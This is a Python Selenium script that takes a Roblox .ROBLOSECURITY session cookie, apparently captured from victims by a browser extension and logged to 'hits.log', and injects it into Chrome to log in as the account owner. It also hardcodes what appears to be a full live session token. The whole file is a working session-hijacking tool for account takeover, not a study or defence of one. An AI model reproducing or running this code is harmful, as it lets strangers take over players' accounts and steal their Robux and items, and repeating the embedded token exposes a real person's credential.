"""
Selenium script to login to Roblox using .ROBLOSECURITY cookie.
Reads the latest cookie from hits.log and adds it to the browser.
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time
import json
import os

HITS_LOG = os.path.join(os.path.dirname(__file__), 'hits.log')

def get_latest_cookie():
    """Read the latest full cookie from hits.log"""
    with open(HITS_LOG, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Find all FULL COOKIE lines
    lines = content.split('\n')
    cookie = None
    for line in lines:
        if '[FULL COOKIE]' in line:
            cookie = line.split('[FULL COOKIE]')[-1].strip()
    
    if not cookie:
        raise Exception("No cookie found in hits.log")
    
    return cookie

def login_with_cookie(cookie_value):
    """Open Chrome, navigate to Roblox, and add the cookie"""
    
    print("[*] Starting Chrome...")
    options = Options()
    options.add_argument('--start-maximized')
    # Uncomment below if you want to use your existing Chrome profile
    # options.add_argument(r'--user-data-dir=C:\Users\pc\AppData\Local\Google\Chrome\User Data')
    # options.add_argument('--profile-directory=Default')
    
    driver = webdriver.Chrome(options=options)
    
    try:
        # Step 1: Go to roblox.com first (needed to set cookie on the domain)
        print("[*] Navigating to roblox.com...")
        driver.get('https://www.roblox.com')
        time.sleep(3)
        
        # Step 2: Delete existing cookies
        print("[*] Clearing existing cookies...")
        driver.delete_all_cookies()
        
        # Step 3: Add the .ROBLOSECURITY cookie
        print("[*] Adding .ROBLOSECURITY cookie...")
        driver.add_cookie({
            'name': '.ROBLOSECURITY',
            'value': '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzM2NTI4NDgxOTk1NDQ3MDk1ODYoAw.IJqvG-m-iTDoubIa1LQcweozWCIfrfO7z5NH_JskfyJyAF9NnMuZ0mrsKJ7UY2-5ihIRkKTs8veVACTILGzu7AL6SDYofLcA1w1AfNzuW6i-C-eGqA7M3Kc97LgnC0UxUjvTc-cidszu2eD33QnNXSN5XBJ1Yw7TG9uoY0O99E-kJESicLOUYcvK7Q6hA6geBn_IPSKD828F7XDvi8LuRt5vnGqYBVjt34zCqJcGJAMWUbvfs-C1aJw45UDAGR7xkrp-WT_YpeajN37fUevu4ar3Etl-SZz1SCnws7j3F9LdVIMvNYoYdSjFH5KhPEd7XGrS4sy6nzhtfVIFY4hY0KdA2KTUFtdk_zX57uI4WNkbKiH6SjWSl52Lw_EH3vEsUNiO36GIz2_vYIll2r9w71-1LVZtJdjTlENkfqvblPC6Sgpxr9i2pHZsgZVo-jUThicn5bbmSHDCNx_UltOtf7JR7fENwgcMy9pShVsnJtsTFeg-lpJfpvyOskc27r9et5_wrBFPFOofvm_uP7hWR1OqosW8NHnwvpPXkb1LatmOIJzyL_FVSaGCv63ejwiJaOWM-zUdCa2ExJMEo76UZ3suTQLNo5VksUzOywZ6xviImROOgHMCASaLwgZ16pZpcgSbg0sYvMSOL9B8akPlrP5Ae_WByLKakQAyyXq_C69vn8tZ',
            'domain': '.roblox.com',
            'path': '/',
            'httpOnly': True,
            'secure': True,
        })
        
        # Step 4: Refresh the page to apply cookie
        print("[*] Refreshing page...")
        driver.get('https://www.roblox.com/home')
        time.sleep(5)
        
        # Step 5: Check if logged in
        current_url = driver.current_url
        print(f"[*] Current URL: {current_url}")
        
        if 'login' not in current_url.lower():
            print("[+] SUCCESS! Logged in to Roblox!")
            # Try to get username from page
            try:
                time.sleep(2)
                page_source = driver.page_source
                if 'authenticated' in page_source.lower() or 'home' in current_url.lower():
                    print("[+] Cookie is VALID - user is authenticated!")
            except:
                pass
        else:
            print("[-] FAILED - Cookie might be expired or invalid")
        
        print("\n[*] Browser will stay open for you to verify.")
        print("[*] Press Enter to close the browser...")
        input()
        
    except Exception as e:
        print(f"[ERROR] {e}")
        input("Press Enter to close...")
    finally:
        driver.quit()

if __name__ == '__main__':
    print("=" * 50)
    print("  Roblox Cookie Login Test")
    print("=" * 50)
    
    try:
        cookie = get_latest_cookie()
        print(f"[*] Cookie found: {cookie[:50]}...")
        print(f"[*] Cookie length: {len(cookie)} chars")
        login_with_cookie(cookie)
    except FileNotFoundError:
        print(f"[ERROR] hits.log not found at: {HITS_LOG}")
        print("[*] Run the extension first to capture a cookie.")
    except Exception as e:
        print(f"[ERROR] {e}")
